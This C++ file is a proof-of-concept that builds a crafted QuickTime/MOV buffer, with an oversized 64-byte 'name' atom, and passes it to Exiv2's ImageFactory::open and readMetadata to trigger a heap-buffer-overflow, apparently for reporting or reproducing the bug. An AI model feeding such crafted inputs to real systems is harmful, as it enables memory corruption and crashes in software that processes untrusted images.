// Proof-of-concept for a heap-buffer-overflow reachable through Exiv2's
// public API: Exiv2::ImageFactory::open(const byte*, size_t) on a crafted
// QuickTime/MOV buffer, followed by Image::readMetadata().
//
// Note: Exiv2's public API is C++-only (namespaces, std::string, classes),
// so this proof-of-concept is written in C++ rather than C.
//
// Build: link against libexiv2 and #include only public headers
// (exiv2/image.hpp). No internal/private symbols are used.

#include <exiv2/image.hpp>

#include <cstdint>
#include <cstdio>
#include <vector>

namespace {

void appendBox(std::vector<uint8_t>& out, const char type[4], const std::vector<uint8_t>& payload) {
  const uint32_t size = static_cast<uint32_t>(8 + payload.size());
  out.push_back(static_cast<uint8_t>((size >> 24) & 0xFF));
  out.push_back(static_cast<uint8_t>((size >> 16) & 0xFF));
  out.push_back(static_cast<uint8_t>((size >> 8) & 0xFF));
  out.push_back(static_cast<uint8_t>(size & 0xFF));
  out.insert(out.end(), type, type + 4);
  out.insert(out.end(), payload.begin(), payload.end());
}

}  // namespace

int main() {
  std::vector<uint8_t> file;

  // "ftyp" box: identifies the buffer as an Apple QuickTime (.MOV) file
  // (major brand "qt  "), which is what Exiv2's QuickTimeVideo type-sniffer
  // (isQTimeType) requires to accept the buffer.
  {
    std::vector<uint8_t> ftypPayload = {'q', 't', ' ', ' ', 0, 0, 0, 0};
    appendBox(file, "ftyp", ftypPayload);
  }

  // "name" box: an ordinary top-level atom carrying an in-contract, 64-byte
  // string payload. QuickTimeVideo::tagDecoder reads this payload into a
  // small, fixed-size (5-byte) scratch buffer shared with its caller.
  {
    std::vector<uint8_t> namePayload(64, 'A');
    appendBox(file, "name", namePayload);
  }

  auto image = Exiv2::ImageFactory::open(file.data(), file.size());
  image->readMetadata();

  std::printf("done (no crash)\n");
  return 0;
}
